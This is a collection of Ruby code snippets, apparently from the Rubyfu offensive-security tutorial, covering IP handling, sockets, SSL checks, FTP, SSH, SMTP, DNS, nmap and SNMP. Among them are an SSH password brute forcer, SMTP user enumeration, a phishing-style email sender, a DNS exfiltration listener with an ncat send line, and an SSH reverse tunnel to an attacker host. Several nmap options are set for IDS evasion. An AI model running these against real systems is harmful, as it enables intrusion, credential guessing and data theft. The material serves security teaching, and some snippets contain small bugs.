["```\nrequire 'ipaddr'\nip = IPAddr.new(\"192.34.56.54/24\") \n```", "```\nrequire 'ipaddr'\nip = IPAddr.new(ARGV[0])\nnetwork_prefix = ip.mask(ARGV[1])\nputs network_prefix \n```", "```\nruby ip_example.rb 192.168.5.130 24\n# Returns\n192.168.5.0 \n```", "```\nrequire 'ipaddr'\nip = IPAddr.new(ARGV[0])\nneg_subnet = ~(IPAddr.new(\"255.255.255.255\").mask(ARGV[1]))\nhost = ip & neg_subnet\nputs host \n```", "```\nruby ip_example.rb 192.168.5.130 24\n# Returns\n0.0.0.130 \n```", "```\nrequire 'ipaddr'\nip=IPAddr.new(\"0.0.0.0/#{ARGV[0]}\")\nputs ip.to_range.count-2 \n```", "```\nruby ip_example.rb 24\n254 \n```", "```\nrequire 'ipaddr'\nnet=IPAddr.new(\"#{ARG[0]}/#{ARGV[1]}\")\nputs net === ARGV[2] \n```", "```\nruby ip_example.rb 192.168.5.128 24 192.168.5.93\ntrue \n```", "```\nruby ip_example.rb 192.168.5.128 24 192.168.6.93\nfalse \n```", "```\nrequire 'ipaddr'\nsubnet_mask = IPAddr.new(ARGV[0])\nputs subnet_mask.to_i.to_s(2).count(\"1\").to_s \n```", "```\nruby ip_example.rb 255.255.255.0\n24 \n```", "```\nrequire 'ipaddr'\nIPAddr.new(3232236159, Socket::AF_INET).to_s \n```", "```\n[3232236159].pack('N').unpack('C4').join('.') \n```", "```\nrequire 'ipaddr'\nIPAddr.new('192.168.2.127').to_i \n```", "```\n    gem install geoip \n    ```", "```\n#!/usr/bin/env ruby\n\nip = ARGV[0]\ngeoip = GeoIP.new('GeoLiteCity.dat')\ngeoinfo = geoip.country(ip).to_hash\n\nputs \"IP address:\\t\"   + geoinfo[:ip]\nputs \"Country:\\t\"      + geoinfo[:country_name]\nputs \"Country code:\\t\" + geoinfo[:country_code2]\nputs \"City name:\\t\"    + geoinfo[:city_name]\nputs \"Latitude:\\t\"     + geoinfo[:latitude]\nputs \"Longitude:\\t\"    + geoinfo[:longitude]\nputs \"Time zone:\\t\"    + geoinfo[:timezone] \n```", "```\n-> ruby ip2location.rb 108.168.255.243\n\nIP address:     108.168.255.243\nCountry:        United States\nCountry code:   US\nCity name:      Dallas\nLatitude:       32.9299\nLongitude:      -96.8353\nTime zone:      America/Chicago \n```", "```\nIO                              # The basis for all input and output in Ruby\n\u2514\u2500\u2500 BasicSocket                 # Abstract base class for all socket classes\n    \u251c\u2500\u2500 IPSocket                # Super class for protocols using the Internet Protocol (AF_INET)\n    \u2502   \u251c\u2500\u2500 TCPSocket           # Class for Transmission Control Protocol (TCP) sockets\n    \u2502   \u2502   \u251c\u2500\u2500 SOCKSSocket     # Helper class for building TCP socket servers applications\n    \u2502   \u2502   \u2514\u2500\u2500 TCPServer       # Helper class for building TCP socket servers\n    \u2502   \u2514\u2500\u2500 UDPSocket           # Class for User Datagram Protocol (UDP) sockets\n    \u251c\u2500\u2500 Socket                  # Base socket class that mimics that BSD Sockets API. It provides more operating system specific functionality\n    \u2514\u2500\u2500 UNIXSocket              # Class providing IPC using the UNIX domain protocol (AF_UNIX)\n        \u2514\u2500\u2500 UNIXServer          # Helper class for building UNIX domain protocol socket servers \n```", "```\nSocket.new(domain, socktype [, protocol]) \n```", "```\n Client        Server\n              |             |                  \n   socket     +             +      socket\n              |             |\n   connect    +--------,    +      bind\n              |         |   |\n   write ,--> +------,  |   +      listen\n         |    |      |  |   |\n   read  `----+ <--, |  `-> +      accept\n              |    | |      |\n   close      +--, | `----> + <--, read <--,\n                 | |        |    |         |\n                 | `--------+----' write   \u0668\n                 |                         |\n                 `----->------>------->----` \n```", "```\nrequire 'socket'\nSocket.ip_address_list \n```", "```\nSocket.gethostname \n```", "```\nrequire 'socket'\n\nserver = TCPServer.new('0.0.0.0', 9911) # Server, binds/listens all interfaces on port 9911\nclient = server.accept                  # Wait for client to connect\nrhost  = client.peeraddr.last           # peeraddr, returns remote [address_family, port, hostname, numeric_address(ip)]\nclient.puts \"Hi TCP Client! #{rhost}\"   # Send a message to the client once it connect\nclient.gets.chomp                       # Read incoming message from client\nclient.close                            # Close the client's connection\nserver.close                            # Close the TCP Server \n```", "```\nrequire 'socket'\nserver = TCPServer.new('0.0.0.0', 0)\nserver.addr[1]    # Shows the picked port \n```", "```\nrequire 'socket'\n\nclient = TCPSocket.new('127.0.0.1', 9911)   # Client, connects to server on port 9911\nrhost  = client.peeraddr.last               # Get the remote server's IP address \nclient.gets.chomp\nclient.puts \"Hi, TCP Server #{rhost}\"\nclient.close \n```", "```\ntimeval = [3, 0].pack(\"l_2\")        # Time interval 3 seconds \nclient.setsockopt Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, timeval      # Set socket receiving time interval \nclient.setsockopt Socket::SOL_SOCKET, Socket::SO_SNDTIMEO, timeval      # Set socket sending time interval\nclient.getsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO).inspect      # Optional, Check if socket option has been set\nclient.getsockopt(Socket::SOL_SOCKET, Socket::SO_SNDTIMEO).inspect      # Optional, Check if socket option has been set \n```", "```\n>> s = TCPSocket.new('0.0.0.0', 9911)\n=> #<TCPSocket:fd 11>\n>> s.method :puts\n=> #<Method: TCPSocket(IO)#puts>\n>> s.method :write\n=> #<Method: TCPSocket(IO)#write>\n>> s.method :send\n=> #<Method: TCPSocket(BasicSocket)#send> \n```", "```\n>> s = TCPSocket.new('0.0.0.0', 9911)\n=> #<TCPSocket:fd 11>\n>> s.method :gets\n=> #<Method: TCPSocket(IO)#gets>\n>> s.method :read\n=> #<Method: TCPSocket(IO)#read>\n>> s.method :recv\n=> #<Method: TCPSocket(BasicSocket)#recv> \n```", "```\nrequire 'socket'\n\nserver = UDPSocket.new                                  # Start UDP socket\nserver.bind('0.0.0.0', 9911)                            # Bind all interfaces to port 9911\nmesg, addr = server.recvfrom(1024)                      # Receive 1024 bytes of the message and the sender IP\nserver puts \"Hi, UDP Client #{addr}\", addr[3], addr[1]  # Send a message to the client \nserver.recv(1024)                                       # Receive 1024 bytes of the message \n```", "```\nrequire 'socket'\nclient = UDPSocket.new\nclient.connect('localhost', 9911)       # Connect to server on port 991\nclient.puts \"Hi, UDP Server!\", 0        # Send message \nserver.recv(1024)                       # Receive 1024 bytes of the server message \n```", "```\nrequire 'gserver'\n\nclass HelloServer < GServer                 # Inherit GServer class\n  def serve(io)\n    io.puts(\"What's your name?\")\n    line = io.gets.chomp\n    io.puts \"Hi, #{line}!\"\n    self.stop if io.gets =~ /shutdown/      # Stop the server if you get shutdown string\n  end\nend\n\nserver = HelloServer.new(1234, '0.0.0.0')   # Start the server on port 1234\nserver.audit = true     # Enable logging\nserver.start            # Start the service \nserver.join \n```", "```\n#!/usr/bin/env ruby\n#\n# KING SABRI | @KINGSABRI\n#\nrequire 'open-uri'\n\ndef validate_https_cert(target)  begin\n    open(\"https://#{target}\")\n    puts '[+] Valid SSL Certificate!'\n  rescue OpenSSL::SSL::SSLError\n    puts '[+] Invalid SSL Certificate!'\n  end\nend\n\ngood_ssl = 'google.com'\nbad_ssl  = 'expired.badssl.com'\n\nvalidate_https_cert good_ssl\nvalidate_https_cert bad_ssl \n```", "```\n#!/usr/bin/env ruby\n#\n# KING SABRI | @KINGSABRI\n#\nrequire 'socket'\nrequire 'openssl'\n\ndef validate_socket_cert(target)\n  ssl_context = OpenSSL::SSL::SSLContext.new  \n  ssl_context.verify_mode = OpenSSL::SSL::VERIFY_PEER  \n  cert_store = OpenSSL::X509::Store.new  \n  cert_store.set_default_paths  \n  ssl_context.cert_store = cert_store  \n  socket = TCPSocket.new(target, 443)  \n  ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)  \n  begin    \n    ssl_socket.connect    \n    puts '[+] Valid SSL Certificate!'  \n  rescue OpenSSL::SSL::SSLError    \n    puts '[+] Invalid SSL Certificate!'  \n  end\nend\n\ngood_ssl = 'google.com'\nbad_ssl  = 'expired.badssl.com'\n\nvalidate_socket_cert good_ssl\nvalidate_socket_cert bad_ssl \n```", "```\n#!/usr/bin/env ruby\n#\n# SSL/TLS validator\n# KING SABRI | @KINGSABRI\n#\n\ndef validate_ssl(target, conn_type=:web)\n\n  case conn_type\n    # Web Based SSL\n    when :web\n      require 'open-uri'\n\n      begin\n        open(\"https://#{target}\")\n        puts '[+] Valid SSL Certificate!'\n      rescue OpenSSL::SSL::SSLError\n        puts '[+] Invalid SSL Certificate!'\n      end\n    # Socked Based SSL\n    when :socket\n      require 'socket'\n      require 'openssl'\n\n      ssl_context = OpenSSL::SSL::SSLContext.new\n      ssl_context.verify_mode = OpenSSL::SSL::VERIFY_PEER\n      cert_store = OpenSSL::X509::Store.new\n      cert_store.set_default_paths\n      ssl_context.cert_store = cert_store\n      socket = TCPSocket.new(target, 443)\n      ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)\n\n      begin\n        ssl_socket.connect\n        puts '[+] Valid SSL Certificate!'\n      rescue OpenSSL::SSL::SSLError\n        puts '[+] Invalid SSL Certificate!'\n      end\n\n    else\n      puts '[!] Unknown connection type!'\n  end\n\nend\n\ngood_ssl = 'google.com'\nbad_ssl  = 'expired.badssl.com'\n\nvalidate_ssl(bad_ssl, :web)\nvalidate_ssl(bad_ssl, :socket)\n\nvalidate_ssl(good_ssl, :web)\nvalidate_ssl(good_ssl, :socket) \n```", "```\nruby ssl_validator.rb\n\n[+] Invalid SSL Certificate!\n[+] Invalid SSL Certificate!\n[+] Valid SSL Certificate!\n[+] Valid SSL Certificate! \n```", "```\n# Run you network car on monitoring mode\nairmon-ng start wls1\n\n# Check running monitoring interfaces\nairmon-ng \n```", "```\n#!/usr/bin/env ruby\nrequire 'socket'\n\n# Open a Soccket as (very low level), (receive as a Raw), (for every packet(ETH_P_ALL))\nsocket = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, 0x03_00)\n\nputs \"\\n\\n\"\nputs \"       BSSID       |       SSID        \"  \nputs \"-------------------*-------------------\"\nwhile true\n  # Capture the wire then convert it to hex then make it as an array\n  packet = socket.recvfrom(2048)[0].unpack('H*').join.scan(/../)\n  #\n  # The Beacon Packet Pattern:\n  # 1- The IEEE 802.11 Beacon frame starts with 0x08000000h, always!\n  # 2- The Beacon frame value located at the 10th to 13th byte\n  # 3- The number of bytes before SSID value is 62 bytes\n  # 4- The 62th byte is the SSID length which is followed by the SSID string\n  # 5- Transmitter(BSSID) or the AP MAC address which is located at 34 to 39 bytes \n  #\n  if packet.size >= 62 && packet[9..12].join == \"08000000\"   # Make sure it's a Beacon frame\n    ssid_length = packet[61].hex - 1                         # Get the SSID's length\n    ssid  = [packet[62..(62 + ssid_length)].join].pack('H*') # Get the SSID \n    bssid = packet[34..39].join(':').upcase                  # Get THE BSSID\n\n    puts \" #{bssid}\" + \"    \" + \"#{ssid}\"\n  end\n\nend \n```", "```\nrequire 'net/ftp'\n\nftp = Net::FTP.new('rubyfu.net', 'admin', 'P@ssw0rd')   # Create New FTP connection\nftp.welcome                                             # The server's welcome message\nftp.system                                              # Get system information\nftp.chdir 'go/to/another/path'                          # Change directory\nfile.pwd                                                # Get the correct directory\nftp.list('*')                                           # or ftp.ls, List all files and folders\nftp.mkdir 'rubyfu_backup'                               # Create directory\nftp.size 'src.png'                                      # Get file size\nftp.get 'src.png', 'dst.png', 1024                      # Download file\nftp.put 'file1.pdf', 'file1.pdf'                        # Upload file\nftp.rename 'file1.pdf', 'file2.pdf'                     # Rename file\nftp.delete 'file3.pdf'                                  # Delete file\nftp.quit                                                # Exit the FTP session\nftp.closed?                                             # Is the connection closed?\nftp.close                                               # Close the connection \n```", "```\n    gem install ftpd \n    ```", "```\n#\n# Pure Ruby FTP server\n# KING SABRI | @KINGSABRI\n#\nrequire 'ftpd'\n\nclass Driver\n  attr_accessor :path, :user, :pass\n  def initialize(path)\n    @path = path\n  end\n\n  def authenticate(user, password)\n    true\n  end\n\n  def file_system(user)\n    Ftpd::DiskFileSystem.new(@path)\n  end\n\nend\n\nclass FTPevil\n\n  def initialize(path=\".\")\n    @driver = Driver.new(File.expand_path(path))\n    @server = Ftpd::FtpServer.new(@driver)\n    configure_server\n    print_connection_info\n  end\n\n  def configure_server\n    @server.server_name = \"Rubyfu FTP Server\"\n    @server.interface = \"0.0.0.0\"\n    @server.port = 21\n  end\n\n  def print_connection_info\n    puts \"[+] Servername: #{@server.server_name}\"\n    puts \"[+] Interface: #{@server.interface}\"\n    puts \"[+] Port: #{@server.port}\"\n    puts \"[+] Directory: #{@driver.path}\"\n    puts \"[+] User: #{@driver.user}\"\n    puts \"[+] Pass: #{@driver.pass}\"\n    puts \"[+] PID: #{$$}\"\n  end\n\n  def start\n    @server.start\n    puts \"[+] FTP server started. (Press CRL+C to stop it)\"\n    $stdout.flush\n    begin\n      loop{}\n    rescue Interrupt\n      puts \"\\n[+] Closing FTP server.\"\n    end\n  end\nend\n\nif ARGV.size >= 1\n  path   = ARGV[0]\nelse\n  puts \"[!] ruby #{__FILE__} <PATH>\"\n  exit\nend\n\nFTPevil.new(path).start \n```", "```\nruby ftpd.rb .\n\nInterface: 0.0.0.0\nPort: 21\nDirectory: /tmp/ftp-share\nUser:\nPass:\nPID: 2366\n[+] FTP server started. (Press CRL+C to stop it) \n```", "```\n    gem install net-ssh \n    ```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'net/ssh'\n\n@hostname = \"localhost\"\n@username = \"root\"\n@password = \"password\"\n@cmd = ARGV[0]\n\nbegin\n  ssh = Net::SSH.start(@hostname, @username, :password => @password)\n  res = ssh.exec!(@cmd)\n  ssh.close\n  puts res\nrescue\n  puts \"Unable to connect to #{@hostname} using #{@username}/#{@password}\"\nend \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'net/ssh'\n\n@hostname = \"localhost\"\n@username = \"root\"\n@password = \"password\"\n\nNet::SSH.start(@hostname, @username, :password => @password, :auth_methods => [\"password\"]) do |session|\n\n  # Open SSH channel\n  session.open_channel do |channel|\n\n    # Requests that a pseudo-tty (or \"pty\") for interactive application-like (e.g vim, sudo, etc)\n    channel.request_pty do |ch, success|\n      raise \"Error requesting pty\" unless success\n\n      # Request channel type shell\n      ch.send_channel_request(\"shell\") do |ch, success|\n        raise \"Error opening shell\" unless success\n        STDOUT.puts \"[+] Getting Remote Shell\\n\\n\" if success\n      end\n    end\n\n    # Print STDERR of the remote host to my STDOUT\n    channel.on_extended_data do |ch, type, data|\n      STDOUT.puts \"Error: #{data}\\n\"\n    end\n\n    # When data packets are received by the channel\n    channel.on_data do |ch, data|\n      STDOUT.print data\n      cmd = gets\n      channel.send_data( \"#{cmd}\" )\n      trap(\"INT\") {STDOUT.puts \"Use 'exit' or 'logout' command to exit the session\"}\n    end\n\n    channel.on_eof do |ch|\n      puts \"Exiting SSH Session..\"\n    end\n\n    session.loop\n  end\nend \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'net/ssh'\n\ndef attack_ssh(host, user, password, port=22, timeout = 5)\n  begin\n    Net::SSH.start(host, user, :password => password,\n                   :auth_methods => [\"password\"], :port => port,\n                   :paranoid => false, :non_interactive => true, :timeout => timeout ) do |session|\n      puts \"Password Found: \" + \"#{host} | #{user}:#{password}\"\n    end\n\n  rescue Net::SSH::ConnectionTimeout\n    puts \"[!] The host '#{host}' not alive!\"\n  rescue Net::SSH::Timeout\n    puts \"[!] The host '#{host}' disconnected/timeouted unexpectedly!\"\n  rescue Errno::ECONNREFUSED\n    puts \"[!] Incorrect port #{port} for #{host}\"\n  rescue Net::SSH::AuthenticationFailed\n    puts \"Wrong Password: #{host} | #{user}:#{password}\"\n  rescue Net::SSH::Authentication::DisallowedMethod\n    puts \"[!] The host '#{host}' doesn't accept password authentication method.\"\n  end\nend\n\nhosts = ['192.168.0.1', '192.168.0.4', '192.168.0.50']\nusers = ['root', 'admin', 'rubyfu']\npasss = ['admin1234', 'P@ssw0rd', '123456', 'AdminAdmin', 'secret', coffee]\n\nhosts.each do |host|\n  users.each do |user|\n    passs.each do |password|\n\n      attack_ssh host, user, password\n\nend end end \n```", "```\n |--------DMZ------|---Local Farm----|\n                              |                 |                 |\n|Attacker| ----SSH Tunnel---> | |SSH Server| <-RDP-> |Web server| |\n                              |                 |                 |\n                              |-----------------|-----------------| \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'net/ssh'\n\nNet::SSH.start(\"127.0.0.1\", 'root', :password => '123132') do |ssh|\n\n  ssh.forward.local('0.0.0.0', 3333, \"WebServer\", 3389)\n\n  puts \"[+] Starting SSH forward tunnel\"\n  ssh.loop { true }\nend \n```", "```\nrdesktop WebServer:3333 \n```", "```\n |--------DMZ------|---Local Farm----|\n                              |                 |                 |\n|Attacker| <---SSH Tunnel---- | |SSH Server| <-RDP-> |Web server| |\n  |   |                       |                 |                 |\n  `->-'                       |-----------------|-----------------| \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'net/ssh'\n\nNet::SSH.start(\"AttacerIP\", 'attacker', :password => '123123') do |ssh|\n\n  ssh.forward.remote_to(3389, 'WebServer', 3333, '0.0.0.0')\n\n  puts \"[+] Starting SSH reverse tunnel\"\n  ssh.loop { true }\nend \n```", "```\nrdesktop localhost:3333 \n```", "```\n    gem install net-scp \n    ```", "```\nrequire 'net/scp'\n\nNet::SCP.upload!(\n                    \"SSHServer\",\n                    \"root\",\n                    \"/rubyfu/file.txt\", \"/root/\",\n                    #:recursive => true,    # Uncomment for recursive\n                    :ssh => { :password => \"123123\" }\n                ) \n```", "```\nrequire 'net/scp'\n\nNet::SCP.download!(\n                    \"SSHServer\",\n                    \"root\",\n                    \"/root/\", \"/rubyfu/file.txt\",\n                    #:recursive => true,    # Uncomment for recursive\n                    :ssh => { :password => \"123123\" }\n                  ) \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'net/smtp'\n\ndef send_mail(smtpsrv, username, password, frmemail, dstemail)\n\n  msg  = \"From: #{frmemail}\\n\"\n  msg += \"To: #{dstemail}\\n\"\n  msg += \"Date: #{date}\\n\"\n  msg += \"Subject: Email Subject\\n\"\n  msg += \"Content-type: text/html\\n\\n\"\n  msg += \"<strong>winter is coming<br>Hi Jon Snow, Please click to win!</strong>\"\n\n  begin\n    Net::SMTP.start(smtpsrv, 25, 'localhost', username, password, :login) do |smtp|\n      smtp.send_message msg, frmemail, dstemail\n    end\n    puts \"[+] Email has been sent successfully!\"\n  rescue Exception => e\n    puts \"[!] Failed to send the mail\"\n    puts e\n  end\n\nend\n\nsmtpsrv  = ARGV[0]\nusername = \"admin@attacker.zone\"\npassword = \"P@ssw0rd\"\nfrmemail = \"admin@attacker.zone\"\ndstemail = \"JonSnow@victim.com\"\n\nsmtpsrv = ARGV[0]\nif smtpsrv.nil?\n  puts \"[!] IP address Missing \\nruby #{__FILE__}.rb [IP ADDRESS]\\n\\n\"\n  exit 0\nend\n\nsend_mail smtpsrv, username, password, frmemail, dstemail \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# \nrequire 'net/imap'\n\nhost = ARGV[0]\nif host.nil?\n  puts \"[!] IP address Missing \\nruby #{__FILE__}.rb [IP ADDRESS]\\n\\n\"\n  exit 0\nend\n\nusername = ARGV[1] || \"admin@attacker.zone\"\npassword = ARGV[2] || \"P@ssw0rd\"\n\nimap = Net::IMAP.new(host, 993, true, nil, false)\nimap.login(username, password)      # imap.authenticate('LOGIN', username, password)\nimap.select('INBOX')\n\nmail_ids = imap.search(['ALL'])\n\n# Read all emails \nmail_ids.each do |id|\n  envelope = imap.fetch(id, \"ENVELOPE\")[0].attr[\"ENVELOPE\"]\n  puts \"[+] Reading message, Subject: #{envelope.subject}\"\n  puts imap.fetch(id,'BODY[TEXT]')[0].attr['BODY[TEXT]']\nend\n\n# Delete all emails \n# mail_ids.each do |id|\n#   envelope = imap.fetch(id, \"ENVELOPE\")[0].attr[\"ENVELOPE\"]\n#   puts \"[+] Deleting message, Subject: #{envelope.subject}\"\n#   imap.store(id, '+FLAGS', [:Deleted]) # Deletes forever No trash!\n# end\n\nimap.close\nimap.logout\nimap.disconnect \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'socket'\n\nusers =\n    %w{\n        root rubyfu www apache2 bin daemon sshd\n        gdm  nobody ftp operator postgres mysqld\n      }\nfound = []\n\n@s = TCPSocket.new('192.168.0.19', 25)\n@banner = @s.recv(1024).chomp\nusers.each do |user|\n  @s.send \"VRFY #{user} \\n\\r\", 0\n  resp = @s.recv(1024).chomp\n  found << user if resp.split[2] == user\nend\n@s.close\n\nputs \"[*] Result:-\"\nputs \"[+] Banner: \" + @banner\nputs \"[+] Found users: \\n#{found.join(\"\\n\")}\" \n```", "```\n[*] Result:-\n[+] Banner: 220 VulnApps.localdomain ESMTP Postfix\n[+] Found users: \nroot\nrubyfu\nwww\nbin\ndaemon\nsshd\ngdm\nnobody\nftp\noperator\npostgres \n```", "```\ngem install net-ping \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n#\nrequire 'net/ping'\n\n@icmp = Net::Ping::ICMP.new(ARGV[0])\nrtary = []\npingfails = 0\nrepeat = 5\nputs 'starting to ping'\n(1..repeat).each do\n  if @icmp.ping\n    rtary << @icmp.duration\n    puts \"host replied in #{@icmp.duration}\"\n  else\n    pingfails += 1\n    puts \"timeout\"\n  end\nend\n\navg = rtary.inject(0) {|sum, i| sum + i}/(repeat - pingfails)\nputs \"Average round-trip is #{avg}\\n\"\nputs \"#{pingfails} packets were dropped\" \n```", "```\n#!/usr/bin/env ruby\n#\n# KING SABRI | @KINGSABRI\n#\nrequire 'socket'\nrequire 'thread'\nrequire 'timeout'\n\nhost = ARGV[0]\n\ndef scan(host)\n  (0..1024).each do |port|\n    Thread.new {\n      begin\n        timeout(3) do                    # timeout of running operation\n          s = TCPSocket.new(host, port)            # Create new socket\n          puts \"[+] #{host} | Port #{port} open\"\n          s.close\n        end\n      rescue Errno::ECONNREFUSED\n        # puts \"[!] #{host} | Port #{port} closed\"\n        next\n      rescue Timeout::Error\n        puts \"[!] #{host} | Port #{port} timeout/filtered\"\n        next\n      end\n    }.join\n  end\nend\n\nscan host \n```", "```\nruby scanner.rb 45.33.32.156    # scanme.nmap.com\n\n[+] 45.33.32.156 | Port 22 open\n[+] 45.33.32.156 | Port 80 open\n[!] 45.33.32.156 | Port 81 timeout\n[!] 45.33.32.156 | Port 85 timeout\n[!] 45.33.32.156 | Port 119 timeout\n[!] 45.33.32.156 | Port 655 timeout\n[!] 45.33.32.156 | Port 959 timeout \n```", "```\ngem install ruby-nmap ronin-scanners gems \n```", "```\nrequire 'nmap'\nscan = Nmap::Program.scan(:targets => '192.168.0.15', :verbose => true) \n```", "```\nrequire 'nmap/program'\n\nNmap::Program.scan do |nmap|\n  nmap.syn_scan = true\n  nmap.service_scan = true\n  nmap.os_fingerprint = true\n  nmap.xml = 'scan.xml'\n  nmap.verbose = true\n\n  nmap.ports = [20,21,22,23,25,80,110,443,512,522,8080,1080,4444,3389]\n  nmap.targets = '192.168.1.*'\nend \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\nrequire 'nmap/program'\n\nNmap::Program.scan do |nmap|\n\n  # Target\n  nmap.targets = '192.168.0.1'\n\n  # Verbosity and Debugging\n  nmap.verbose = true\n  nmap.show_reason = true\n\n  # Port Scanning Techniques:\n  nmap.syn_scan = true          # You can use nmap.all like -A in nmap\n\n  # Service/Version Detection:\n  nmap.service_scan = true\n  nmap.os_fingerprint = true\n  nmap.version_all = true\n\n  # Script scanning\n  nmap.script = \"all\"\n\n  nmap.all_ports                # nmap.ports = (0..65535).to_a\n\n  # Firewall/IDS Evasion and Spoofing:\n  nmap.decoys = [\"google.com\",\"yahoo.com\",\"hotmail.com\",\"facebook.com\"]\n  nmap.spoof_mac = \"00:11:22:33:44:55\"\n  # Timing and Performance\n  nmap.min_parallelism = 30\n  nmap.max_parallelism = 130\n\n  # Scan outputs\n  nmap.output_all = 'rubyfu_scan'\n\nend \n```", "```\nnmap -n -v -A scanme.nmap.org -oX scanme.nmap.org.xml \n```", "```\nrequire 'nmap/xml'\n\nNmap::XML.new(ARGV[0]) do |xml|\n  xml.each_host do |host|\n    puts \"[#{host.ip}]\"\n    # Print: Port/Protocol      port_status      service_name\n    host.each_port do |port|\n      puts \"  #{port.number}/#{port.protocol}\\t#{port.state}\\t#{port.service}\"\n    end\n  end\nend \n```", "```\n[45.33.32.156]\n  22/tcp        open    ssh\n  80/tcp        open    http\n  9929/tcp      open    nping-echo \n```", "```\nrequire 'resolv'\nResolv.getaddresses \"rubyfu.net\" \n```", "```\n[\"23.23.122.48\", \"107.20.161.48\", \"174.129.41.187\"] \n```", "```\nrequire 'resolv'\nResolv.getnames \"23.23.122.48\" \n```", "```\n[\"ec2-174-129-41-187.compute-1.amazonaws.com\"] \n```", "```\n#!/usr/bin/env ruby\n# KING SABRI | @KINGSABRI\n# for hex in $(xxd -p ethernet-cable.jpg); do echo $hex | ncat -u localhost 53 ; done\n# \nrequire 'socket'\n\nif ARGV.size < 1\n  puts \"[+] sudo ruby #{__FILE__} <FILENAME>\"\n  exit\nelse\n  file = ARGV[0]\nend\n\n# Open UDP Socket and bind it to port 53 on all interfaces\nudpsoc = UDPSocket.new\nudpsoc.bind('0.0.0.0', 53)\n\nbegin\n\n  data     = ''\n  data_old = ''\n\n  loop do\n    response = udpsoc.recvfrom(1000)\n    response = response[0].force_encoding(\"ISO-8859-1\").encode(\"utf-8\")\n    data = response.match(/[^<][a-f0-9]([a-f0-9]).*[a-f0-9]([a-f0-9])/i).to_s\n\n    # Write received data to file\n    File.open(file, 'a') do |d|\n      d.write [data].pack(\"H*\") unless data == data_old     # Don't write the same data twice(poor workaround)\n      puts data unless data == data_old\n    end\n\n    data_old = data \n  end\n\nrescue Exception => e\n  puts e\nend \n```", "```\nruby dnsteal.rb image.jpg \n```", "```\ngem install net-dns \n```", "```\nrequire 'net/dns' \n```", "```\nrequire 'net/dns'\nresolver = Net::DNS::Resolver.start(\"google.com\") \n```", "```\n;; Answer received from 127.0.1.1:53 (260 bytes)\n;;\n;; HEADER SECTION\n;; id = 36568\n;; qr = 1       opCode: QUERY   aa = 0  tc = 0  rd = 1\n;; ra = 1       ad = 0  cd = 0  rcode = NoError\n;; qdCount = 1  anCount = 6     nsCount = 4     arCount = 4\n\n;; QUESTION SECTION (1 record):\n;; google.com.                  IN      A\n\n;; ANSWER SECTION (6 records):\ngoogle.com.             31      IN      A       64.233.183.102\ngoogle.com.             31      IN      A       64.233.183.113\ngoogle.com.             31      IN      A       64.233.183.100\ngoogle.com.             31      IN      A       64.233.183.139\ngoogle.com.             31      IN      A       64.233.183.101\ngoogle.com.             31      IN      A       64.233.183.138\n\n;; AUTHORITY SECTION (4 records):\ngoogle.com.             152198  IN      NS      ns1.google.com.\ngoogle.com.             152198  IN      NS      ns3.google.com.\ngoogle.com.             152198  IN      NS      ns4.google.com.\ngoogle.com.             152198  IN      NS      ns2.google.com.\n\n;; ADDITIONAL SECTION (4 records):\nns3.google.com.         152198  IN      A       216.239.36.10\nns4.google.com.         152198  IN      A       216.239.38.10\nns2.google.com.         152198  IN      A       216.239.34.10\nns1.google.com.         345090  IN      A       216.239.32.10 \n```", "```\nresolver.header\nresolver.question\nresolver.answer\nresolver.authority\nresolver.additional \n```", "```\nresolver = Net::DNS::Resolver.start(\"google.com\") \n```", "```\nresolver = Net::DNS::Resolver.start(\"google.com\").answer \n```", "```\n[google.com.             34      IN      A       74.125.239.35,\n google.com.             34      IN      A       74.125.239.39,\n google.com.             34      IN      A       74.125.239.33,\n google.com.             34      IN      A       74.125.239.34,\n google.com.             34      IN      A       74.125.239.36,\n google.com.             34      IN      A       74.125.239.32,\n google.com.             34      IN      A       74.125.239.46,\n google.com.             34      IN      A       74.125.239.40,\n google.com.             34      IN      A       74.125.239.38,\n google.com.             34      IN      A       74.125.239.37,\n google.com.             34      IN      A       74.125.239.41] \n```", "```\nmx = Net::DNS::Resolver.start(\"google.com\", Net::DNS::MX).answer \n```", "```\n[google.com.             212     IN      MX      40 alt3.aspmx.l.google.com.,\n google.com.             212     IN      MX      30 alt2.aspmx.l.google.com.,\n google.com.             212     IN      MX      20 alt1.aspmx.l.google.com.,\n google.com.             212     IN      MX      50 alt4.aspmx.l.google.com.,\n google.com.             212     IN      MX      10 aspmx.l.google.com.] \n```", "```\nany = Net::DNS::Resolver.start(\"facebook.com\", Net::DNS::ANY).answer \n```", "```\n[facebook.com.           385     IN      A       173.252.120.6,\n facebook.com.           85364   IN      TXT     ,\n facebook.com.           149133  IN      NS      b.ns.facebook.com.,\n facebook.com.           149133  IN      NS      a.ns.facebook.com.] \n```", "```\nresolver = Net::DNS::Resolver.new\nquery = resolver.query(\"69.171.239.12\", Net::DNS::PTR) \n```", "```\nresolver = Net::DNS::Resolver.new(:nameserver => \"8.8.8.8\") \n```", "```\nresolver = Net::DNS::Resolver.new\nresolver.nameservers = [\"8.8.4.4\" , \"8.8.8.8\"] \n```", "```\n    gem install snmp \n    ```", "```\n# KING SABRI | @KINGSABRI\nrequire 'snmp'\n\n# Connect to SNMP server\nmanager = SNMP::Manager.new(:host => '192.168.0.17')\n\n# General info\nputs \"SNMP Version: \" + manager.config[:version]\nputs \"Community: \" + manager.config[:community]\nputs \"Write Community: \" + manager.config[:WriteCommunity]\n\n# Get hostname, contact and location\nhostname = manager.get(\"sysName.0\").each_varbind.map {|vb| vb.value.to_s}       # 